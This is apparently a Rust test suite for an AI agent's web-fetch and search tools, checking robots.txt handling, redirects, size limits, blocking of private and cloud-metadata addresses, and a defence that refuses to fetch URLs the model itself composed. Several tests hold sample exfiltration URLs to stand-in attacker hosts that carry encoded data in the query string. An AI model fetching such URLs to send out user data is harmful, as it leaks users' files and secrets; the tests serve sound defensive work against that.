use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::TcpListener;
use std::sync::atomic::{AtomicUsize, Ordering};

use super::*;

#[derive(Clone)]
struct Route {
    status: &'static str,
    content_type: &'static str,
    body: Vec<u8>,
    location: Option<String>,
    delay: Duration,
}

fn route(status: &'static str, content_type: &'static str, body: impl Into<Vec<u8>>) -> Route {
    Route {
        status,
        content_type,
        body: body.into(),
        location: None,
        delay: Duration::ZERO,
    }
}

fn slow(route: Route, delay: Duration) -> Route {
    Route { delay, ..route }
}

fn redirect(status: &'static str, location: impl Into<String>) -> Route {
    Route {
        location: Some(location.into()),
        ..route(status, "text/plain", "")
    }
}

struct Site {
    base: String,
    requests: Arc<Mutex<Vec<String>>>,
    hits: Arc<AtomicUsize>,
}

fn site(routes: Vec<(&'static str, Route)>) -> Site {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let base = format!("http://{}", listener.local_addr().unwrap());
    let routes: HashMap<&'static str, Route> = routes.into_iter().collect();
    let requests: Arc<Mutex<Vec<String>>> = Arc::default();
    let hits = Arc::new(AtomicUsize::new(0));
    let recorded = requests.clone();
    let counted = hits.clone();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut stream) = stream else {
                return;
            };
            let mut buffer = [0u8; 8192];
            let mut raw = Vec::new();
            loop {
                let read = stream.read(&mut buffer).unwrap_or(0);
                if read == 0 {
                    break;
                }
                raw.extend_from_slice(&buffer[..read]);
                if raw.windows(4).any(|window| window == b"\r\n\r\n") {
                    break;
                }
            }
            let request = String::from_utf8_lossy(&raw).into_owned();
            let path = request.split_whitespace().nth(1).unwrap_or("/").to_string();
            if path != "/robots.txt" {
                counted.fetch_add(1, Ordering::SeqCst);
            }
            recorded.lock().unwrap().push(request);
            let reply = routes
                .get(path.as_str())
                .cloned()
                .unwrap_or_else(|| route("404 Not Found", "text/plain", "missing"));
            std::thread::sleep(reply.delay);
            let location = reply
                .location
                .as_deref()
                .map(|location| format!("Location: {location}\r\n"))
                .unwrap_or_default();
            let head = format!(
                "HTTP/1.1 {}\r\nContent-Type: {}\r\n{location}Content-Length: {}\r\nConnection: close\r\n\r\n",
                reply.status,
                reply.content_type,
                reply.body.len()
            );
            let _ = stream.write_all(head.as_bytes());
            let _ = stream.write_all(&reply.body);
        }
    });
    Site {
        base,
        requests,
        hits,
    }
}

fn options() -> WebFetchOptions {
    WebFetchOptions {
        user_agent: "Oleafly/test".into(),
        ..WebFetchOptions::default()
    }
}

fn fetch_call(url: &str, offset: Option<usize>) -> ToolCall {
    let mut arguments = json!({ "url": url });
    if let Some(offset) = offset {
        arguments["offset"] = json!(offset);
    }
    ToolCall {
        id: "w".into(),
        name: WEB_FETCH_TOOL.into(),
        arguments: arguments.to_string(),
        ..Default::default()
    }
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn large_pages_are_truncated_at_five_megabytes() {
    let site = site(vec![(
        "/big",
        route("200 OK", "text/plain", vec![b'a'; 6 * 1024 * 1024]),
    )]);
    let page = web_fetch(
        &WebClient::for_tests(),
        &format!("{}/big", site.base),
        &options(),
    )
    .await
    .unwrap();
    assert!(page.truncated);
    assert!(page.markdown.len() <= MAX_FETCH_BYTES);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn pdfs_and_binary_types_are_reported_not_parsed() {
    let site = site(vec![
        ("/paper.pdf", route("200 OK", "application/pdf", "%PDF-1.7")),
        (
            "/logo.png",
            route("200 OK", "image/png", vec![0x89, b'P', b'N', b'G']),
        ),
    ]);
    let client = WebClient::for_tests();
    let pdf = web_fetch(&client, &format!("{}/paper.pdf", site.base), &options())
        .await
        .unwrap_err();
    assert!(pdf.to_string().contains("This is a PDF"));
    let png = web_fetch(&client, &format!("{}/logo.png", site.base), &options())
        .await
        .unwrap_err();
    assert_eq!(png.to_string(), "This content type is not supported.");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn robots_disallow_stops_the_fetch() {
    let page = route("200 OK", "text/plain", "hello");
    let closed = site(vec![
        (
            "/robots.txt",
            route("200 OK", "text/plain", "User-agent: *\nDisallow: /\n"),
        ),
        ("/p", page.clone()),
    ]);
    let error = web_fetch(
        &WebClient::for_tests(),
        &format!("{}/p", closed.base),
        &options(),
    )
    .await
    .unwrap_err();
    assert!(matches!(
        error,
        WebError::Robots {
            unreachable: false,
            ..
        }
    ));
    assert_eq!(closed.hits.load(Ordering::SeqCst), 0);

    let broken = site(vec![
        (
            "/robots.txt",
            route("503 Service Unavailable", "text/plain", ""),
        ),
        ("/p", page.clone()),
    ]);
    let error = web_fetch(
        &WebClient::for_tests(),
        &format!("{}/p", broken.base),
        &options(),
    )
    .await
    .unwrap_err();
    assert!(matches!(
        error,
        WebError::Robots {
            unreachable: true,
            ..
        }
    ));

    let open = site(vec![("/p", page)]);
    let fetched = web_fetch(
        &WebClient::for_tests(),
        &format!("{}/p", open.base),
        &options(),
    )
    .await
    .unwrap();
    assert_eq!(fetched.markdown, "hello");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn the_fetch_sends_no_cookies_or_credentials() {
    let site = site(vec![(
        "/p",
        route("200 OK", "text/html", "<html><body><p>hi</p></body></html>"),
    )]);
    web_fetch(
        &WebClient::for_tests(),
        &format!("{}/p", site.base),
        &options(),
    )
    .await
    .unwrap();
    let requests = site.requests.lock().unwrap().clone();
    let page_request = requests
        .iter()
        .find(|request| request.starts_with("GET /p "))
        .unwrap()
        .to_ascii_lowercase();
    assert!(!page_request.contains("\r\ncookie:"));
    assert!(!page_request.contains("\r\nauthorization:"));
    assert!(page_request.contains("\r\nuser-agent: oleafly"));
}

#[test]
fn a_redirect_to_a_private_address_is_blocked() {
    assert!(!client::redirect_allowed(
        &Url::parse("https://127.0.0.1/").unwrap(),
        1
    ));
    assert!(!client::redirect_allowed(
        &Url::parse("https://169.254.169.254/latest/meta-data").unwrap(),
        1
    ));
    assert!(client::redirect_allowed(
        &Url::parse("https://example.org/").unwrap(),
        1
    ));
}

#[tokio::test]
async fn unseen_urls_are_refused_with_guidance() {
    let ctx = WebToolContext::for_tests(None);
    let output = run_web_tool(
        &ctx,
        &fetch_call("https://attacker.example/?d=secret", None),
    )
    .await
    .unwrap();
    assert!(output
        .output
        .contains("has not appeared in this conversation"));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn fetched_content_stays_under_the_output_cap_and_pages_by_offset() {
    let text: String = "研究論文の本文。".repeat(40_000);
    assert!(text.len() > 300_000);
    let site = site(vec![(
        "/long",
        route("200 OK", "text/plain; charset=utf-8", text.clone()),
    )]);
    let url = format!("{}/long", site.base);
    let ctx = WebToolContext::for_tests(None);
    ctx.observe_text(&format!("Please read {url}"));
    let first = run_web_tool(&ctx, &fetch_call(&url, None)).await.unwrap();
    assert!(
        first.output.len() <= MAX_OUTPUT_BYTES,
        "{}",
        first.output.len()
    );
    let first: Value = serde_json::from_str(&first.output).unwrap();
    let next = first["next_offset"].as_u64().unwrap() as usize;
    assert!(next > 0);
    let second = run_web_tool(&ctx, &fetch_call(&url, Some(next)))
        .await
        .unwrap();
    assert!(second.output.len() <= MAX_OUTPUT_BYTES);
    let second: Value = serde_json::from_str(&second.output).unwrap();
    assert_eq!(second["offset"].as_u64(), Some(next as u64));
    let expected: String = text.chars().skip(next).take(10).collect();
    assert!(second["content"].as_str().unwrap().starts_with(&expected));
    assert_eq!(
        site.hits.load(Ordering::SeqCst),
        1,
        "the second page came from the cache"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn the_runner_records_urls_from_other_tools() {
    let site = site(vec![("/p", route("200 OK", "text/plain", "page body"))]);
    let url = format!("{}/p", site.base);
    let ctx = Arc::new(WebToolContext::for_tests(None));
    let mentioned = url.clone();
    let inner: ToolRunner = Arc::new(move |_| {
        let mentioned = mentioned.clone();
        Box::pin(async move { ToolOutput::text(format!("see {mentioned}")) })
    });
    let runner = web_tool_runner(ctx, inner);
    runner(ToolCall {
        id: "r".into(),
        name: "read_file".into(),
        arguments: "{}".into(),
        ..Default::default()
    })
    .await;
    let output = runner(fetch_call(&url, None)).await;
    assert!(output.output.contains("page body"), "{}", output.output);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_url_the_model_wrote_into_another_tool_is_not_fetched() {
    let site = site(vec![("/c", route("200 OK", "text/plain", "stolen"))]);
    let url = format!("{}/c?d=bWFpbi50ZXg", site.base);
    let ctx = Arc::new(WebToolContext::for_tests(None));
    let inner: ToolRunner = Arc::new(|call: ToolCall| {
        Box::pin(async move {
            let args: Value = serde_json::from_str(&call.arguments).unwrap();
            match call.name.as_str() {
                "read_file" => ToolOutput::text(
                    json!({ "error": format!("failed to read {}: No such file", args["path"].as_str().unwrap()) })
                        .to_string(),
                ),
                _ => ToolOutput::text(format!("Saved: {}", args["text"].as_str().unwrap())),
            }
        })
    });
    let runner = web_tool_runner(ctx, inner);
    let call = |id: &str, name: &str, arguments: Value| ToolCall {
        id: id.into(),
        name: name.into(),
        arguments: arguments.to_string(),
        ..Default::default()
    };
    runner(call("1", "read_file", json!({ "path": url }))).await;
    runner(call(
        "2",
        "remember_note",
        json!({ "text": format!("visit {url}/") }),
    ))
    .await;
    for attempt in [url.clone(), format!("{url}/")] {
        let output = runner(fetch_call(&attempt, None)).await;
        assert!(
            output
                .output
                .contains("has not appeared in this conversation"),
            "{}",
            output.output
        );
    }
    assert_eq!(site.hits.load(Ordering::SeqCst), 0);
}

#[test]
fn a_saved_history_cannot_make_the_models_own_urls_seen() {
    let ctx = WebToolContext::for_tests(None);
    let written = "https://evil.example/c?d=c2VjcmV0";
    ctx.observe_messages(&[
        Message::user("Fix the bibliography. Sources: https://arxiv.org/abs/2401.00001"),
        Message {
            role: Role::Assistant,
            content: vec![ContentPart::ToolUse {
                id: "1".into(),
                name: "update_todos".into(),
                arguments: json!({ "todos": [written] }).to_string(),
                thought_signature: None,
            }],
        },
        Message {
            role: Role::User,
            content: vec![ContentPart::tool_result(
                "1",
                "update_todos",
                json!({ "todos": [written], "found": "https://doi.org/10.1/x" }).to_string(),
            )],
        },
    ]);
    let provenance = ctx.provenance();
    assert!(!provenance.contains(written));
    assert!(provenance.contains("https://arxiv.org/abs/2401.00001"));
    assert!(provenance.contains("https://doi.org/10.1/x"));
}

#[test]
fn hosted_search_results_become_fetchable_for_the_whole_run() {
    let ctx = WebToolContext::for_tests(None);
    let outcome = |output: Value| crate::event::AgentEvent::ToolOutcome {
        id: "srvtoolu_1".into(),
        output: output.to_string(),
    };
    ctx.observe_event(&outcome(
        json!({ "results": [{ "title": "P", "url": "https://arxiv.org/abs/1" }] }),
    ));
    ctx.observe_event(&outcome(
        json!({ "sources": [{ "url": "https://e.org/2" }] }),
    ));
    ctx.observe_event(&outcome(json!({ "note": "https://evil.example/n" })));
    ctx.observe_event(&outcome(
        json!({ "error": "x", "results": [{ "url": "https://evil.example/e" }] }),
    ));
    ctx.observe_messages(&[Message {
        role: Role::Assistant,
        content: vec![ContentPart::ProviderBlock {
            wire: crate::message::ProviderWire::Anthropic,
            block: json!({
                "type": "web_search_tool_result",
                "tool_use_id": "srvtoolu_2",
                "content": [{ "type": "web_search_result", "url": "https://history.example/3", "title": "T", "encrypted_content": "x" }]
            }),
        }],
    }]);
    let provenance = ctx.provenance();
    for seen in [
        "https://arxiv.org/abs/1",
        "https://e.org/2",
        "https://history.example/3",
    ] {
        assert!(provenance.contains(seen), "{seen}");
    }
    assert!(!provenance.contains("https://evil.example/n"));
    assert!(!provenance.contains("https://evil.example/e"));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_chat_is_not_told_to_use_a_tool_it_lacks_for_a_pdf() {
    let site = site(vec![(
        "/paper.pdf",
        route("200 OK", "application/pdf", "%PDF-1.7"),
    )]);
    let url = format!("{}/paper.pdf", site.base);
    let ctx = WebToolContext::for_tests(None);
    ctx.observe_text(&url);
    let output = run_web_tool(&ctx, &fetch_call(&url, None)).await.unwrap();
    assert!(output.output.contains("This is a PDF"), "{}", output.output);
    assert!(!output.output.contains("read_paper"), "{}", output.output);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn text_that_decoding_grows_past_the_cap_is_marked_truncated() {
    // 4 MB of Cyrillic in windows-1251 is 8 MB of UTF-8.
    let site = site(vec![(
        "/ru",
        route(
            "200 OK",
            "text/plain; charset=windows-1251",
            vec![0xE0u8; 4 * 1024 * 1024],
        ),
    )]);
    let page = web_fetch(
        &WebClient::for_tests(),
        &format!("{}/ru", site.base),
        &options(),
    )
    .await
    .unwrap();
    assert!(page.truncated);
    assert!(page.markdown.len() <= MAX_FETCH_BYTES);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_slow_robots_txt_counts_against_the_fetch_timeout() {
    let site = site(vec![
        (
            "/robots.txt",
            slow(route("200 OK", "text/plain", ""), Duration::from_secs(20)),
        ),
        ("/p", route("200 OK", "text/plain", "page")),
    ]);
    let opts = WebFetchOptions {
        timeout: Duration::from_millis(500),
        ..options()
    };
    let started = Instant::now();
    let error = web_fetch(&WebClient::for_tests(), &format!("{}/p", site.base), &opts)
        .await
        .unwrap_err();
    assert_eq!(error, WebError::Timeout);
    assert!(started.elapsed() < Duration::from_secs(10));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_page_that_takes_too_long_to_convert_is_read_as_plain_text() {
    let page = format!(
        "<html><body><h1>Title</h1>{}</body></html>",
        "<p>word</p>".repeat(100_000)
    );
    let extracted = extract_html(
        page.clone(),
        Url::parse("https://site.org/").unwrap(),
        Duration::ZERO,
    )
    .await;
    assert_eq!(extracted.markdown, html::flatten(&page).markdown);
    assert!(extracted.markdown.starts_with("Title"));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_deeply_nested_page_is_fetched_as_text_without_crashing() {
    let depth = 50_000;
    let body = format!(
        "{}leaf{}",
        "<ul><li>".repeat(depth),
        "</li></ul>".repeat(depth)
    );
    let site = site(vec![(
        "/deep",
        route(
            "200 OK",
            "text/html",
            format!("<html><body>{body}</body></html>"),
        ),
    )]);
    let page = web_fetch(
        &WebClient::for_tests(),
        &format!("{}/deep", site.base),
        &options(),
    )
    .await
    .unwrap();
    assert_eq!(page.markdown, "leaf");
}

#[tokio::test]
async fn search_without_a_key_explains_how_to_add_one() {
    let ctx = WebToolContext::for_tests(None);
    assert!(!ctx.has_search());
    let output = run_web_tool(
        &ctx,
        &ToolCall {
            id: "s".into(),
            name: WEB_SEARCH_TOOL.into(),
            arguments: r#"{"query":"claude shannon"}"#.into(),
            ..Default::default()
        },
    )
    .await
    .unwrap();
    assert!(output.output.contains("Settings"), "{}", output.output);
}

#[test]
fn the_tool_schemas_refuse_extra_arguments() {
    for schema in [web_search_schema(), web_fetch_schema()] {
        assert_eq!(schema.input_schema["additionalProperties"], false);
    }
    assert_eq!(
        web_search_schema().input_schema["properties"]["query"]["maxLength"],
        400
    );
}

#[test]
fn other_tools_are_not_web_tools() {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    let ctx = WebToolContext::for_tests(None);
    let output = runtime.block_on(run_web_tool(
        &ctx,
        &ToolCall {
            name: "read_file".into(),
            ..Default::default()
        },
    ));
    assert!(output.is_none());
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn punctuation_added_to_a_seen_url_is_not_fetched() {
    let site = site(vec![
        ("/page", route("200 OK", "text/plain", "body")),
        ("/page.,;:)", route("200 OK", "text/plain", "smuggled")),
    ]);
    let url = format!("{}/page", site.base);
    let ctx = WebToolContext::for_tests(None);
    ctx.observe_text(&format!("Please read {url} and summarize it"));

    let tricked = run_web_tool(&ctx, &fetch_call(&format!("{url}.,;:)"), None))
        .await
        .unwrap();
    assert!(
        tricked
            .output
            .contains("has not appeared in this conversation"),
        "{}",
        tricked.output
    );
    assert_eq!(site.hits.load(Ordering::SeqCst), 0);

    let honest = run_web_tool(&ctx, &fetch_call(&url, None)).await.unwrap();
    assert!(honest.output.contains("body"), "{}", honest.output);
    let requests = site.requests.lock().unwrap().clone();
    assert!(requests
        .iter()
        .any(|request| request.starts_with("GET /page ")));
    assert!(!requests
        .iter()
        .any(|request| request.starts_with("GET /page.")));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_redirect_is_followed_and_the_new_site_robots_txt_applies() {
    let closed = site(vec![
        (
            "/robots.txt",
            route("200 OK", "text/plain", "User-agent: *\nDisallow: /\n"),
        ),
        ("/p", route("200 OK", "text/plain", "private")),
    ]);
    let open = site(vec![("/p", route("200 OK", "text/plain", "public"))]);
    let start = site(vec![
        (
            "/to-closed",
            redirect("302 Found", format!("{}/p", closed.base)),
        ),
        (
            "/to-open",
            redirect("301 Moved Permanently", format!("{}/p#frag", open.base)),
        ),
        ("/relative", redirect("303 See Other", "/landing")),
        ("/landing", route("200 OK", "text/plain", "landed")),
    ]);
    let client = WebClient::for_tests();

    let error = web_fetch(&client, &format!("{}/to-closed", start.base), &options())
        .await
        .unwrap_err();
    assert!(
        matches!(
            error,
            WebError::Robots {
                unreachable: false,
                ..
            }
        ),
        "{error:?}"
    );
    assert_eq!(
        closed.hits.load(Ordering::SeqCst),
        0,
        "the page was never requested"
    );

    let page = web_fetch(&client, &format!("{}/to-open", start.base), &options())
        .await
        .unwrap();
    assert_eq!(page.markdown, "public");
    assert_eq!(page.url, format!("{}/p", open.base));

    let landed = web_fetch(&client, &format!("{}/relative", start.base), &options())
        .await
        .unwrap();
    assert_eq!(landed.markdown, "landed");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn redirects_are_bounded_and_may_not_leave_http_and_https() {
    let looping = site(vec![("/loop", redirect("302 Found", "/loop"))]);
    let error = web_fetch(
        &WebClient::for_tests(),
        &format!("{}/loop", looping.base),
        &options(),
    )
    .await
    .unwrap_err();
    assert!(matches!(error, WebError::NotAllowed(_)), "{error:?}");
    assert_eq!(
        looping.hits.load(Ordering::SeqCst),
        client::MAX_REDIRECTS + 1
    );

    let elsewhere = site(vec![(
        "/out",
        redirect("302 Found", "ftp://example.org/file"),
    )]);
    let error = web_fetch(
        &WebClient::for_tests(),
        &format!("{}/out", elsewhere.base),
        &options(),
    )
    .await
    .unwrap_err();
    assert!(matches!(error, WebError::NotAllowed(_)), "{error:?}");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_robots_txt_that_redirects_is_followed() {
    let site = site(vec![
        ("/robots.txt", redirect("301 Moved Permanently", "/rules")),
        (
            "/rules",
            route("200 OK", "text/plain", "User-agent: *\nDisallow: /secret\n"),
        ),
        ("/secret", route("200 OK", "text/plain", "hidden")),
        ("/open", route("200 OK", "text/plain", "visible")),
    ]);
    let client = WebClient::for_tests();
    let error = web_fetch(&client, &format!("{}/secret", site.base), &options())
        .await
        .unwrap_err();
    assert!(
        matches!(
            error,
            WebError::Robots {
                unreachable: false,
                ..
            }
        ),
        "{error:?}"
    );
    let page = web_fetch(&client, &format!("{}/open", site.base), &options())
        .await
        .unwrap();
    assert_eq!(page.markdown, "visible");
}
